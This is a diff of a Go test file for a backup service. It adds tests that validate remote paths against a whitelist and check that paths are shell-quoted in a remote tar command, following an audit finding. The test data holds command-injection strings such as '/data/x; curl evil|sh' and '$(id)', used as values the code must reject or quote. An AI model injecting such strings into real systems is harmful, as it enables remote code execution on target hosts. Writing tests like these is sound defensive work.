@@ -5,6 +5,7 @@ import (
 	"compress/gzip"
 	"context"
 	"encoding/json"
+	"fmt"
 	"io"
 	"os"
 	"path/filepath"
@@ -212,5 +213,53 @@ func TestScheduleNextAndScan(t *testing.T) {
 	db.First(&after, j.ID)
 	if after.NextRunAt == nil || !after.NextRunAt.After(time.Now()) {
 		t.Error("next_run_at 应推进到未来")
+	}
+}
+
+// 远端路径白名单（v0.12.0 审计严重项 4）：RemotePath 拆分后拼进目标机 shell，
+// '/data/x; curl evil|sh; #' 这类输入必须在校验层被拒。
+func TestValidateJobRemotePathWhitelist(t *testing.T) {
+	svc := &Service{cfg: &config.Config{Database: config.Database{Driver: "sqlite"}}}
+	ok := []string{"/data/app", "/var/log/nginx", "/srv/backup.2024", "/data/a_b-c"}
+	for _, p := range ok {
+		in := SaveJobInput{Name: "n", Type: TypeRemoteDir, ServerID: 1, RemotePath: p,
+			Storage: StorageLocal, RetentionCount: 3}
+		if err := svc.validateJob(in); err != nil {
+			t.Errorf("合法路径被拒 %q: %v", p, err)
+		}
+	}
+	bad := []string{
+		"/data/x; curl evil|sh", // 命令注入
+		"/data/x$(id)",          // 命令替换
+		"/data/a b",             // 空白
+		"/data/目录",              // 中文
+		"data/relative",         // 相对路径
+		"~/home",                // 非 / 开头
+		"/data/x`id`",           // 反引号
+		"/-lead",                // 首字符非字母数字
+	}
+	for _, p := range bad {
+		in := SaveJobInput{Name: "n", Type: TypeRemoteDir, ServerID: 1, RemotePath: p,
+			Storage: StorageLocal, RetentionCount: 3}
+		if err := svc.validateJob(in); err == nil {
+			t.Errorf("非法路径未被拒: %q", p)
+		}
+	}
+}
+
+// 拼装层引号化：即使带元字符的路径穿透到 runner，tar 命令里也必须被引号包裹。
+func TestWriteRemoteDirQuotesShellMetachars(t *testing.T) {
+	var gotCmd string
+	r := &runner{
+		job: Job{ServerID: 1, RemotePath: "/data/x; curl evil|sh", Type: TypeRemoteDir},
+		sshRun: func(_ context.Context, _ uint, cmd string, _ time.Duration) (string, error) {
+			gotCmd = cmd
+			return "", fmt.Errorf("stop here")
+		},
+		sftpPull: func(_ context.Context, _ uint, _ string, _ io.Writer) (int64, error) { return 0, nil },
+	}
+	_ = r.writeRemoteDir(context.Background(), tar.NewWriter(io.Discard), &manifest{})
+	if !strings.Contains(gotCmd, "-C '/data' 'x; curl evil|sh'") {
+		t.Errorf("parent/base 应被 shellQuote 包裹: %q", gotCmd)
 	}
 }
